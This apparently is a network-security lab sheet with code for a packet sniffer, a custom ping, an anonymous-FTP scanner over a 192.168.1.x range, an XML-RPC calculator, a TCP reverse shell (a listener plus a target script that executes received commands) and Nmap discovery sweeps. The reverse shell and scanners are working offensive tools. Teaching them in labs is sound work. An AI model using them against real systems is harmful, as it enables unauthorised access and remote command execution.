Experiment 4 – Packet Sniffing using Raw Sockets
------------------------------------------------

File: sniffer.py

import socket
import struct

def mac(addr):
    return ':'.join(f'{b:02x}' for b in addr)

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

print("Sniffing... Press Ctrl+C to stop")
while True:
    raw, _ = s.recvfrom(65535)
    eth = struct.unpack('!6s6sH', raw[:14])
    print(f"Src MAC: {mac(eth[1])}  Dst MAC: {mac(eth[0])}  Proto: {hex(eth[2])}")
    
    if eth[2] == 0x0800:  # IPv4
        ip_header = struct.unpack('!BBHHHBBH4s4s', raw[14:34])
        src_ip = socket.inet_ntoa(ip_header[8])
        dst_ip = socket.inet_ntoa(ip_header[9])
        print(f"   IP: {src_ip} --> {dst_ip}   TTL: {ip_header[5]}")

Run:
sudo python3 sniffer.py


Experiment 5 – Customized Ping
------------------------------

File: custom_ping.py

import socket, struct, time, os, select

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
    s = (s >> 16) + (s & 0xffff)
    return ~s & 0xffff

def ping(host, count=4):
    dest = socket.gethostbyname(host)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    pid = os.getpid() & 0xFFFF

    for seq in range(count):
        header = struct.pack('bbHHh', 8, 0, 0, pid, seq)
        data = b'CustomPing'
        cs = checksum(header + data)
        header = struct.pack('bbHHh', 8, 0, cs, pid, seq)
        
        sock.sendto(header + data, (dest, 0))
        start = time.time()
        ready = select.select([sock], [], [], 2)
        
        if ready[0]:
            sock.recvfrom(1024)
            rtt = (time.time() - start) * 1000
            print(f"Reply from {dest}: seq={seq} time={rtt:.2f} ms")
        else:
            print(f"Request timed out (seq={seq})")
    sock.close()

ping("google.com")

Run:
sudo python3 custom_ping.py


Experiment 6 – Anonymous FTP Scanner
------------------------------------

File: ftp_scanner.py

import ftplib
from concurrent.futures import ThreadPoolExecutor

def scan(ip):
    try:
        ftp = ftplib.FTP(timeout=3)
        ftp.connect(ip, 21)
        ftp.login("anonymous", "anon@test.com")
        print(f"[+] {ip} → Anonymous FTP OPEN")
        print("   Files:", ftp.nlst()[:5])
        ftp.quit()
    except:
        pass

targets = [f"192.168.1.{i}" for i in range(1, 50)]
with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(scan, targets)


Experiment 7 – Simple Calculator using XML-RPC
----------------------------------------------

Server (calc_server.py):

from xmlrpc.server import SimpleXMLRPCServer

def add(a, b): return a + b
def sub(a, b): return a - b
def mul(a, b): return a * b
def div(a, b): return a / b if b != 0 else "Error"

server = SimpleXMLRPCServer(("localhost", 8000), allow_none=True)
server.register_function(add)
server.register_function(sub)
server.register_function(mul)
server.register_function(div)

print("Calculator Server running on port 8000...")
server.serve_forever()


Client (calc_client.py):

import xmlrpc.client

proxy = xmlrpc.client.ServerProxy("http://localhost:8000")
print("10 + 5 =", proxy.add(10, 5))
print("10 - 5 =", proxy.sub(10, 5))
print("10 * 5 =", proxy.mul(10, 5))
print("10 / 5 =", proxy.div(10, 5))


Experiment 8 – Reverse Shell using TCP Sockets
----------------------------------------------

Listener (listener.py) - Run first:

import socket

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)
print("[*] Waiting for connection...")
conn, addr = s.accept()
print(f"[+] Connected: {addr}")

while True:
    cmd = input("Shell> ")
    if cmd.lower() == "exit":
        conn.send(b"exit")
        break
    conn.send(cmd.encode())
    print(conn.recv(4096).decode(errors="ignore"))
conn.close()


Shell (shell.py) - Target:

import socket, subprocess

s = socket.socket()
s.connect(("127.0.0.1", 4444))   # change IP if needed

while True:
    cmd = s.recv(1024).decode().strip()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
s.close()

Experiment 12 – Nmap Host Discovery
-----------------------------------

# ARP Scan (local network)
nmap -PR -sn 192.168.1.0/24

# ICMP Echo
nmap -PE -sn 10.10.x.x

# TCP SYN Ping
nmap -PS22,80,443 -sn 10.10.x.x

# TCP ACK Ping
nmap -PA80 -sn 10.10.x.x

# UDP Ping
nmap -PU53 -sn 10.10.x.x

# Combined + Verbose
nmap -PE -PS22,80 -PU53 -sn -v 10.10.x.x/24

# Save output
nmap -sn -oN discovery.txt 10.10.x.x/24
